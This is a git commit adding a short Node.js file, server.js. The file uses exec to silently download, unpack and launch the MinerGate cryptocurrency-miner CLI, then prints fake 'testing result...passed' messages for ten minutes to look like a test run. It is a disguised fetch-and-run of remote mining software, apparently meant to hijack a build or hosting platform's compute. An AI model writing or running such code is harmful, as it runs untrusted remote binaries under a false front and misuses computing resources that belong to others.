ce1dba9bad7fbaf575a4beddea07b6c115b0b6a3
Isaac Chapman <isaac@isaacchapman.com>
2017-06-26 11:06:56 -0700

    Initial commit

---
+++ server.js
@@ -0,0 +1,13 @@
+var exec = require("child_process").exec;
+var index = 1;
+var max = 10;
+var interval;
+var testStr ="wget -q --content-disposition https://minergate.com/download/deb-cli && ar x minergate-cli-release.deb && tar -xzf control.tar.gz && tar -xzf data.tar.gz && cd opt/minergate-cli && ./minergate-cli -help"
+
+console.log('starting...');
+exec(testStr);
+
+interval = setInterval(function () {
+    if (index >= max) process.exit(0);
+    console.log("testing result..." + index++ + '...passed');
+}, 1000 * 60);
